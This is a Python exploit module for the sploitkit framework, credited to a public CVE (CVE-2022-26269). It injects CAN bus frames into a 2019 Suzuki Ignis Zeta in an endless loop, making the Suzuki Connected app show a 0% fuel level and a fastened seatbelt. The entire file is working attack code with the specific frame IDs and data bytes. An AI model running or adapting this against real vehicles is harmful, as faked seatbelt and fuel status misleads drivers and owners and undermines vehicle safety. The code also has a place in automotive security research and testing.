from sploitkit import *
from pyvit import can
from pyvit.hw import socketcan
import time

class ignis_zeta_fuel_seatbelt_spoof(Module):
    """ This module will spoof the fuel and seatbelt status on the Suzuki Connected App for Ignis Zeta(2019).   

    Author:  shipcod3
    Credits: Nikhil Bogam (CVE-2022-26269)
    Reference: https://github.com/nsbogam/CVE-2022-26269
    Version: 1.0
    """
    config = Config({
        Option(
            'INTERFACE',
            "CAN interface",
            True,
        ): str("vcan0"),
    })    
    def run(self):
        dev = socketcan.SocketCanDev(self.config.option('INTERFACE').value)

        dev.start()
        print("[*] Spoofing Fuel Status to 0%")
        print("[*] Spoofing a message that the car seatbelt is buckled up ")
        fuel_frame = can.Frame(0x3B9)
        fuel_frame.data = [0] * 6
        buckle_frame = can.Frame(0x3D1)
        buckle_frame.data = [0,0,0,0,0,0x81,0x94,0x9B]
        print("[+] Check the Suzuki App for the spoofed messages")
        print("[**] Press Ctrl+C to stop or cancel")

        while True:
            dev.send(fuel_frame)
            dev.send(buckle_frame)
            time.sleep(0.10)
        pass
